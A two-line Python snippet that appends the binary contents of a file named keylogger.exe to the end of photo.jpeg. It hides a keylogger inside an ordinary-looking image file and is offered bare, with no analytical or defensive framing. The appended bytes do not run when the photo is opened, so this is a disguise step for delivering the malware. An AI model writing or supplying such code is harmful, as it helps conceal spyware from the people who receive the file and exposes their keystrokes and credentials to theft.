with open('photo.jpeg', 'ab') as f, open('keylogger.exe', 'rb') as e:
    f.write(e.read())